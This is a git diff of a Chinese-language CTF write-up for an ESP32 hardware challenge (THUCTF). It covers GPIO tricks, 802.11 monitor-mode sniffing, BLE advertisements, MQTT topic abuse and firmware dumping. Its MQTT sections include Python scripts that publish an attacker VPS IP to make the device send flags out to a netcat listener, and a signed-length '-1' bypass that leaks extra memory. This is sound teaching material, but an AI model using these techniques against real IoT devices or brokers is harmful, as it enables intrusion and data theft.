@@ -14,7 +14,7 @@ task1 -> task2 -> task3
 
 ### task1
 
-- 题面：将GPIO18抬高，持续3s即可获得flag
+- 题目：将GPIO18抬高，持续3s即可获得flag
 - 解法：用杜邦线将GPIO18与3.3v或5v相接
 
 
@@ -29,7 +29,7 @@ task1 -> task2 -> task3
 
 ### task2
 
-- 题面：在GPIO18处构造出1w个上升沿
+- 题目：在GPIO18处构造出1w个上升沿
 - 解法：用杜邦线将GPIO18与板子的TX相接，利用串口一直有数据输出，自动构造上升沿：
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211126153122219.png?raw=true)
@@ -122,12 +122,29 @@ THUCTF{Sn1ffer_N3tw0rk_TrAffic_In_7h4_Main_r0aD}
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174624863.png?raw=true)
 
 
-如果是MAC可直接使用内置网卡抓包：
+如果是MAC电脑，则不需要外置网卡，可直接使用自带网卡抓包，首先确定目标wifi的信道：
 
 ```
 ➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
-➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 1 
+
+            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
+        Huawei@123 7c:b5:9b:53:be:a8 -50  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+            hegysa 12:c0:c9:62:70:de -33  1       Y  CN WPA2(PSK/AES/AES) 
 ```
+
+然后抓取目标信道：
+
+```
+➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 1 
+Capturing 802.11 frames on en0.
+```
+
+开启wireshark并将无线网卡设置成监控模式，然后即可抓取802.11的裸包：
+
+
+
+![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/macwifi.png?raw=true)
+
 
 ```
 THUCTF{Y0u_cAn_s3nd_4nd_sNiff3r_802.11_r4w_pAckag3}
@@ -161,7 +178,7 @@ bluetooth task I : THUCTF{b1u3t00th_n4me_a1s0_c4n_b3_An_aTT4ck_surfAce}
 ### task2
 
 - 题目：flag在空中
-- 解法：通过第一关后，板子会由经典蓝牙切换到低功耗蓝牙，flag就在BLE的广播报文中，使用手机软件nRF connect即可获得：
+- 解法：通过第一关后，板子会由经典蓝牙切换到低功耗蓝牙，flag就在BLE的广播报文中，使用手机软件[nRF connect](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=en&gl=US)即可获得：
 
 
 ```
@@ -235,6 +252,12 @@ mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175038978.png?raw=true)
 
 
+另外也可以使用python来订阅MQTT服务，依赖安装：
+
+```python
+➜  python3 -m pip install paho-mqtt
+```
+
 ```python
 import paho.mqtt.client as mqtt
 
@@ -258,10 +281,11 @@ client.loop_forever()
 ### task2 
 
 - 题目：分析GATT业务并获得flag
-- 解法：向flag2目标主题发送伪造IP即可
+- 解法：向flag2目标主题发送自己VPS的IP即可
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175056665.png?raw=true)
 
+当然也可以使用python向目标topic发送消息：
 
 ```python
 import paho.mqtt.client as mqtt
@@ -270,6 +294,8 @@ client = mqtt.Client()
 client.connect("mqtt.esp32ctf.xyz",1883,60)
 client.publish("/topic/flag2/tdzloj","49.233.20.19")
 ```
+
+即可在VPS上收到flag：
 
 ```python
 ubuntu@VM-16-6-ubuntu:~$ sudo nc -l -p 80
@@ -283,9 +309,10 @@ flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel}
 - 题目：分析GATT业务并获得flag
 - 解法：判断长度时有符号，比较时相当于无符号，故长度为-1即可绕过大小限制，带出位于flag2后的flag3
 
-
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175117275.png?raw=true)
 
+
+当然也可以直接在VPS上一个脚本搞定：
 
 ```python
 import paho.mqtt.client as mqtt
@@ -300,6 +327,8 @@ client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
 print(io.recv())                 
 ```
 
+结果如下：
+
 ```python
 ubuntu@VM-16-6-ubuntu:~$ sudo python3 exp.py 
 [+] Trying to bind to :: on port 80: Done
@@ -311,10 +340,11 @@ b'GET / HTTP/1.0\r\nUser-Agent: esp-idf/1.0 esp32\r\nflag: THUCTF{attAck_t0_th3_
 
 ## 固件彩蛋
 
-使用esptools dump固件：
+使用esptools.py dump固件：
 
 ```python
-➜   python ~/Desktop/esp/esp-idf2/components/esptool_py/esptool/esptool.py --baud 115200 --port /dev/tty.usbserial-14420 read_flash 0x10000 0x310000 dump.bin
+➜   python ~/Desktop/esp/esp-idf2/components/esptool_py/esptool/esptool.py \
+    --baud 115200 --port /dev/tty.usbserial-14420 read_flash 0x10000 0x310000 dump.bin
 ```
 
 windows上的IDF离线环境安装后，自动设置的环境变量中，也是可以直接用esptools.py的：
@@ -322,6 +352,8 @@ windows上的IDF离线环境安装后，自动设置的环境变量中，也是�
 ```python
 > esptool.py --baud 115200  read_flash 0x10000 0x310000 dump.bin
 ```
+
+然后strings即可找出flag：
 
 ```python
 $ sudo apt install binutils
